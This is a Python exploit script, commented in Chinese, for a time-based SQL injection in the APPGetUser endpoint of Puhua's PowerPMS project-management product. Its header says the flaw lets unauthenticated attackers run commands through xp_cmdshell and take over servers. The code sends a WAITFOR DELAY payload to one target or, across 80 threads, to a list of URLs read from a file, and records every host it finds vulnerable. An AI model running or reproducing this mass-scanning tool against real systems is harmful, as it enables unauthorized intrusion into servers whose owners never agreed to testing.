# -*- coding: utf-8 -*-
# 普华-PowerPMS APPGetUser SQL注入
# app="普华科技-PowerPMS"
# 产品简介:某owerPMS是上海普华科技自主研发的移动端工程项目管理产品。支持中英文切换，可与普华某owerOn、某owerPiP系列产品配套使用。产品与工程项目为核心，为项目各参建方提供包括任务管理、文档管理、质量检查、安全检查、施工日志、进度反馈、即时消息等功能在内的服务。产品通过与WEB数据联动、工作流程、消息机制、在线协作，为工程项目跨组织、跨专业、跨地域多方协作提供了解决方案，可有效提高业主、工程总包、施工单位等项目各参与方的沟通与协作效率。
# 漏洞概述:普华-某owerPMS APPGetUser 接口处存在SQL注入漏洞,未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
        \x1b[38m██████╗ ██╗  ██╗      ███████╗ ██████╗ ██╗     
        \x1b[36m██╔══██╗██║  ██║      ██╔════╝██╔═══██╗██║     
        \x1b[34m██████╔╝███████║█████╗███████╗██║   ██║██║     
        \x1b[35m██╔═══╝ ██╔══██║╚════╝╚════██║██║▄▄ ██║██║     
        \x1b[31m██║     ██║  ██║      ███████║╚██████╔╝███████╗
        \x1b[33m╚═╝     ╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                                                                                                                                    
    --author:Kucei  --Version:普华-PowerPMS_APPGetUser-SQL注入
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<                                                 
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('普华-PowerPMS_APPGetUser-SQL注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = '/APPAccount/APPGetUser?name=1'
    url_payload2 = '/APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A5%27--'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response1 = requests.get(url=target+url_payload1,headers=headers,verify=False,timeout=7)
        response2 = requests.get(url=target+url_payload2,headers=headers,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time2 - time1 >= 3.5:
            print( f"[+] {target} 存在漏洞！\n")
            with open('普华-PowerPMS_APPGetUser-SQL注入.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload2+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()